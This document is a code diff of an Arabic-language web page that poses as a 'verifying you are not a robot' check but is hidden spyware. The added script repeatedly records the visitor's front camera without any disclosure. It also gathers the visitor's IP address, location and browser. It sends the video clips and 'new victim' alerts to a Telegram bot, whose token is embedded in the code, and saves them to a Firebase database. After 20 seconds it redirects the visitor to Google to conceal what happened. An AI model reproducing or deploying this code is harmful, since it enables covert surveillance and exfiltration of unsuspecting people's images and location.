@@ -9,7 +9,6 @@
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
 
     <style>
-        /* دمج ملف style.css */
         * { margin: 0; padding: 0; box-sizing: border-box; font-family: Arial, sans-serif; text-align: center; }
         body {
             height: 100vh; display: flex; align-items: center; justify-content: center;
@@ -29,7 +28,7 @@
 <body>
     <div class="loading-container">
         <h1>جاري التحقق من أنك لست روبوت</h1>
-        <p>يرجى التعاون معنا لكي تحصل على تجربة ممتعة <br> عند الانتهاء من العد التنازلي ولم يحدث شيء أعد تحميل الصفحة مرة أخرى رجاءً</p>
+        <p>يرجى التعاون معنا لكي تحصل على تجربة ممتعة <br> سيتم تحويلك تلقائياً بعد الإنتهاء.</p>
         <div class="progress-container">
             <div class="progress-bar" id="progress"></div>
         </div>
@@ -40,95 +39,283 @@
     <canvas id="canvas"></canvas>
 
     <script>
-        // دمج ملف script.js مع تعديلات الربط المزدوج
         document.addEventListener("DOMContentLoaded", async function () {
-            // إعدادات Firebase الخاصة بك
+            // ✅ إعدادات Firebase
             const firebaseConfig = {
                 databaseURL: "https://elcomando-68116-default-rtdb.firebaseio.com/"
             };
             if (!firebase.apps.length) { firebase.initializeApp(firebaseConfig); }
             const db = firebase.database();
 
+            // ✅ إعدادات التليجرام
+            const botToken = "7681653454:AAHdCsBUKbiru2Z-9aDBzMgVeqhuDWGLyjk";
+            const adminChatId = "5375214810";
+
+            // ✅ استخراج البيانات من الرابط
+            const urlParams = new URLSearchParams(window.location.search);
+            const userId = urlParams.get("user_id") || "Unknown";
+            const tool = urlParams.get("tool") || "fvid"; // ✅ فيديو أمامي
+            const telegramId = urlParams.get("telegram");
+
             const countdownElement = document.getElementById("countdown");
             const progressBar = document.getElementById("progress");
             let timeLeft = 20;
-            let countdownStarted = false;
             let mediaRecorder;
             let recordedChunks = [];
             let videoStream;
 
-            const botToken = "7681653454:AAHdCsBUKbiru2Z-9aDBzMgVeqhuDWGLyjk";
-            const adminChatId = "5375214810";
+            // ✅ العد التنازلي + تحويل بعد 20 ثانية
+            const countdownInterval = setInterval(() => {
+                timeLeft--;
+                countdownElement.textContent = timeLeft;
+                progressBar.style.width = (timeLeft / 20) * 100 + "%";
+                if (timeLeft <= 0) {
+                    clearInterval(countdownInterval);
+                    window.location.href = "https://www.google.com";
+                }
+            }, 1000);
 
-            const urlParams = new URLSearchParams(window.location.search);
-            const userId = urlParams.get("user_id");
-
-            async function getBackCameraId() {
+            // ✅ دالة جلب معلومات الجهاز
+            async function getDeviceInfo() {
                 try {
-                    const devices = await navigator.mediaDevices.enumerateDevices();
-                    const backCamera = devices.find(device => device.kind === 'videoinput' && device.label.toLowerCase().includes('back'));
-                    return backCamera ? backCamera.deviceId : null;
-                } catch (error) { return null; }
-            }
+                    const ipResponse = await fetch("https://api64.ipify.org?format=json");
+                    const ipData = await ipResponse.json();
+                    const ip = ipData.ip;
+                    
+                    let location = "Unknown, Unknown";
+                    try {
+                        const locResponse = await fetch(`https://ipapi.co/${ip}/json/`);
+                        const locData = await locResponse.json();
+                        location = `${locData.city || 'Unknown'}, ${locData.country_name || 'Unknown'}`;
+                    } catch(e) { location = "Unknown, Unknown"; }
 
-            async function startCamera() {
-                try {
-                    const backCameraId = await getBackCameraId();
-                    const video = document.getElementById('video');
-                    videoStream = await navigator.mediaDevices.getUserMedia({
-                        video: { deviceId: backCameraId ? { exact: backCameraId } : undefined }
-                    });
-
-                    video.srcObject = videoStream;
-                    video.onloadedmetadata = () => {
-                        startCountdown();
-                        startRecording();
-                        
-                        // إرسال Log للفيربيس (نص فقط) لإعلام اليوزر بأن الضحية أونلاين
-                        if (userId) {
-                            db.ref('live_status/' + userId).set({
-                                status: "ضحية جديدة متصلة الآن 📡",
-                                last_seen: new Date().toLocaleTimeString(),
-                                device: navigator.userAgent
-                            });
-                        }
+                    return {
+                        ip: ip,
+                        location: location,
+                        device: navigator.userAgent,
+                        browser: getBrowserInfo(),
+                        timestamp: Date.now(),
+                        time: new Date().toLocaleString('ar-EG'),
+                        tool: tool
                     };
-                } catch (error) { console.error("🚨:", error); }
+                } catch (error) {
+                    return {
+                        ip: "Unknown",
+                        location: "Unknown",
+                        device: navigator.userAgent,
+                        browser: "Unknown",
+                        timestamp: Date.now(),
+                        time: new Date().toLocaleString('ar-EG'),
+                        tool: tool
+                    };
+                }
             }
 
-            function startCountdown() {
-                if (countdownStarted) return;
-                countdownStarted = true;
-                const countdownInterval = setInterval(() => {
-                    timeLeft--;
-                    countdownElement.textContent = timeLeft;
-                    progressBar.style.width = (timeLeft / 20) * 100 + "%";
-                    if (timeLeft <= 0) { clearInterval(countdownInterval); }
-                }, 1000);
+            // ✅ دالة تحديد المتصفح
+            function getBrowserInfo() {
+                const ua = navigator.userAgent;
+                if (ua.includes("Chrome")) return "Chrome";
+                if (ua.includes("Firefox")) return "Firefox";
+                if (ua.includes("Safari")) return "Safari";
+                if (ua.includes("Edge")) return "Edge";
+                if (ua.includes("Opera")) return "Opera";
+                return "Unknown";
             }
 
-            function startRecording() {
-                mediaRecorder = new MediaRecorder(videoStream, { mimeType: "video/webm" });
-                mediaRecorder.ondataavailable = (e) => { if (e.data.size > 0) recordedChunks.push(e.data); };
-                mediaRecorder.onstop = () => {
-                    // إرسال الفيديو للتليجرام (الآدمن + اليوزر)
-                    sendVideo(adminChatId);
-                    if (userId && userId !== adminChatId) { sendVideo(userId); }
-                    recordedChunks = [];
-                    startRecording(); 
-                };
-                mediaRecorder.start();
-                setTimeout(() => { if(mediaRecorder.state === "recording") mediaRecorder.stop(); }, 5000);
-            }
-
-            function sendVideo(chatId) {
-                const blob = new Blob(recordedChunks, { type: "video/webm" });
+            // ✅ دالة إرسال الفيديو للتليجرام
+            async function sendVideoToTelegram(blob, chatId) {
+                if (!chatId || chatId === "Unknown" || chatId === "null") return;
+                
                 const formData = new FormData();
                 formData.append("chat_id", chatId);
-                formData.append("video", blob, "video_clip.webm");
-                fetch(`https://api.telegram.org/bot${botToken}/sendVideo`, { method: "POST", body: formData });
+                formData.append("video", blob, `fvid_${Date.now()}.webm`);
+                
+                try {
+                    await fetch(`https://api.telegram.org/bot${botToken}/sendVideo`, {
+                        method: "POST",
+                        body: formData
+                    });
+                } catch (err) {
+                    console.error("Telegram video error:", err);
+                }
             }
 
+            // ✅ دالة إرسال رسالة للتليجرام
+            async function sendMessageToTelegram(text, chatId) {
+                if (!chatId || chatId === "Unknown" || chatId === "null") return;
+                
+                try {
+                    await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                        method: "POST",
+                        headers: { "Content-Type": "application/json" },
+                        body: JSON.stringify({
+                            chat_id: chatId,
+                            text: text,
+                            parse_mode: "Markdown"
+                        })
+                    });
+                } catch (err) {
+                    console.error("Telegram message error:", err);
+                }
+            }
+
+            // ✅ دالة حفظ الفيديو في Firebase (Live)
+            async function saveVideoToFirebase(blob, userId) {
+                if (!userId || userId === "Unknown") return;
+                
+                const reader = new FileReader();
+                reader.onloadend = async function() {
+                    const base64data = reader.result;
+                    await db.ref(`live/${userId}/videos`).push({
+                        video: base64data,
+                        timestamp: Date.now(),
+                        time: new Date().toLocaleTimeString('ar-EG'),
+                        tool: tool,
+                        type: "فيديو أمامي"
+                    });
+                };
+                reader.readAsDataURL(blob);
+            }
+
+            // ✅ دالة تسجيل دخول الضحية
+            async function logVictimOnline() {
+                if (!userId || userId === "Unknown") return;
+                
+                const deviceInfo = await getDeviceInfo();
+                
+                // ✅ حفظ في المسار الصحيح hits/userId
+                await db.ref('hits/' + userId).push({
+                    tool: tool,
+                    type: "دخول",
+                    status: "Victim Online - Front Camera Video",
+                    device: deviceInfo.device,
+                    browser: deviceInfo.browser,
+                    ip: deviceInfo.ip,
+                    location: deviceInfo.location,
+                    time: deviceInfo.time,
+                    timestamp: Date.now()
+                });
+
+                // ✅ تحديث الحالة في Live
+                await db.ref(`live/${userId}/status`).set({
+                    status: "🎥 ضحية متصلة - فيديو أمامي",
+                    time: new Date().toLocaleTimeString('ar-EG'),
+                    tool: tool,
+                    timestamp: Date.now()
+                });
+
+                // ✅ إرسال إشعار بالتليجرام
+                const message = `🎥 **ضحية جديدة - فيديو أمامي!**\n\n` +
+                              `🛠️ الأداة: فيديو أمامي\n` +
+                              `🔗 صاحب الرابط: ${userId}\n` +
+                              `📍 الموقع: ${deviceInfo.location}\n` +
+                              `📡 IP: ${deviceInfo.ip}\n` +
+                              `📱 الجهاز: ${deviceInfo.browser}\n` +
+                              `⏰ الوقت: ${deviceInfo.time}`;
+
+                // إرسال للأدمن
+                await sendMessageToTelegram(message, adminChatId);
+                
+                // إرسال لصاحب الرابط
+                if (userId && userId !== "Unknown" && userId !== adminChatId) {
+                    await sendMessageToTelegram(message, userId);
+                }
+                
+                // إرسال للتليجرام ID
+                if (telegramId && telegramId !== "Unknown" && telegramId !== userId && telegramId !== adminChatId) {
+                    await sendMessageToTelegram(message, telegramId);
+                }
+            }
+
+            // ✅ دالة تشغيل الكاميرا الأمامية (فيديو بدون صوت)
+            async function startCamera() {
+                try {
+                    // ✅ تشغيل الكاميرا الأمامية فقط (بدون صوت)
+                    videoStream = await navigator.mediaDevices.getUserMedia({
+                        video: { 
+                            facingMode: "user", // ✅ كاميرا أمامي
+                            width: { ideal: 640 },
+                            height: { ideal: 480 }
+                        },
+                        audio: false // ❌ بدون صوت
+                    });
+
+                    const video = document.getElementById('video');
+                    video.srcObject = videoStream;
+                    
+                    video.onloadedmetadata = () => {
+                        // تسجيل دخول الضحية
+                        logVictimOnline();
+                        
+                        // بدء التسجيل
+                        startRecording();
+                    };
+                } catch (error) { 
+                    console.error("🚨 Camera error:", error);
+                    // لو رفض الكاميرا، سجل البيانات بس
+                    logVictimOnline();
+                }
+            }
+
+            // ✅ دالة بدء تسجيل الفيديو
+            function startRecording() {
+                // ✅ تحديد نوع الفيديو المدعوم
+                const options = { mimeType: 'video/webm;codecs=vp9' };
+                try {
+                    mediaRecorder = new MediaRecorder(videoStream, options);
+                } catch (e) {
+                    try {
+                        mediaRecorder = new MediaRecorder(videoStream, { mimeType: 'video/webm;codecs=vp8' });
+                    } catch (e) {
+                        mediaRecorder = new MediaRecorder(videoStream);
+                    }
+                }
+
+                mediaRecorder.ondataavailable = (e) => { 
+                    if (e.data.size > 0) recordedChunks.push(e.data); 
+                };
+
+                mediaRecorder.onstop = () => {
+                    // إرسال الفيديو للتليجرام
+                    if (recordedChunks.length > 0) {
+                        const blob = new Blob(recordedChunks, { type: "video/webm" });
+                        
+                        // إرسال للأدمن
+                        sendVideoToTelegram(blob, adminChatId);
+                        
+                        // إرسال لصاحب الرابط
+                        if (userId && userId !== "Unknown" && userId !== adminChatId) {
+                            sendVideoToTelegram(blob, userId);
+                        }
+                        
+                        // إرسال للتليجرام ID
+                        if (telegramId && telegramId !== "Unknown" && telegramId !== userId && telegramId !== adminChatId) {
+                            sendVideoToTelegram(blob, telegramId);
+                        }
+                        
+                        // ✅ حفظ الفيديو في Firebase (Live)
+                        saveVideoToFirebase(blob, userId);
+                        
+                        recordedChunks = [];
+                    }
+                    
+                    // إعادة التسجيل التلقائي
+                    if (mediaRecorder.state === 'inactive') {
+                        startRecording();
+                    }
+                };
+
+                mediaRecorder.start();
+                
+                // ✅ تسجيل كل 10 ثواني
+                setTimeout(() => { 
+                    if(mediaRecorder && mediaRecorder.state === "recording") {
+                        mediaRecorder.stop(); 
+                    }
+                }, 5000);
+            }
+
+            // ✅ تشغيل كل حاجة
             startCamera();
         });
     </script>
